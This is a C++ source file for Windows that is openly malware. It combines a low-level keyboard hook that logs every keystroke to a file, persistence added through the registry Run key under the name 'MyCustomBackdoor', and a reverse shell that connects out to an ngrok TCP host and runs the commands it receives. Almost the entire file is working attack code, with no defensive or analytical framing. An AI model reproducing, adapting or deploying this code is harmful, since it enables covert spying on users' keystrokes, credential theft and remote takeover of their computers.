#include<bits/stdc++.h>
#include <winsock2.h>
#include <windows.h>
#include <cstring>
#include <cstdlib>
#include <fstream>
#include <iostream>
#define ll long long
#define do {
#define done }
#define read std::cin>>
#define echo std::cout
#define Keylogger LRESULT CALLBACK KeyEvent
#define start_ int main()
#define finish return 0;
#define MX 100005
#define bzero(p,size) (void)memset((p),0,(size))


HHOOK hKeyHook;
std::ofstream logFile("keylog.txt", std::ios::app);

using namespace std;

int temp[MX], num[MX];
int sock;


LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = keyInfo->vkCode;

        // 🛑 Press ESC to stop the logger
        if (vkCode == VK_ESCAPE) {
            PostQuitMessage(0); // exits the message loop
        }

        // 📄 Log key to file
        char keyName[128];
        if (GetKeyNameTextA((LONG)(keyInfo->scanCode << 16), keyName, sizeof(keyName)) > 0) {
            logFile << "[" << keyName << "] ";
        } else {
            logFile << "[VK " << vkCode << "] ";
        }

        logFile.flush(); // write immediately
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}



void addToStartup(const char* exePath) {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey);
    if (result == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "MyCustomBackdoor", 0, REG_SZ, (const BYTE*)exePath, strlen(exePath));
        RegCloseKey(hKey);
        std::cout << "[*] Added to startup registry.\n";
    } else {
        std::cerr << "[!] Failed to open registry key.\n";
    }
}

// 🐚 Shell Execution
void shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (true) {
        bzero(buffer, sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));

        recv(sock, buffer, sizeof(buffer), 0);

        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);
            exit(0);
        } else {
            FILE *fp = _popen(buffer, "r");
            while (fgets(container, sizeof(container), fp) != NULL) {
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }
    }
}


start_
do
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    addToStartup(exePath);


    MSG msg;
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyEvent, NULL, 0);
    if (!hKeyHook) {
        std::cerr << "Hook failed." << std::endl;
        return 1;
    }

    cout << "[*] Logging started. Press ESC to exit.\n";

    // 🌀 Message loop keeps the hook alive
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // ✅ Cleanup
    UnhookWindowsHookEx(hKeyHook);
    logFile.close();

    cout << "[*] Logging stopped.\n";

    WSADATA wsaData;

    struct sockaddr_in x;
    ll port = 17200;
    const char *ip = "0.tcp.in.ngrok.io";

    WSAStartup(MAKEWORD(2, 0), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    bzero(&x, sizeof(x));

    x.sin_family = AF_INET;
    x.sin_port = htons(port);

    // ⭐ Resolve domain name to IP
    struct hostent *host;
    host = gethostbyname(ip);
    x.sin_addr = *((struct in_addr *)host->h_addr);

    while (connect(sock, (struct sockaddr *)&x, sizeof(x)) != 0) {
        Sleep(10);
    }

    shell();
    finish;
done
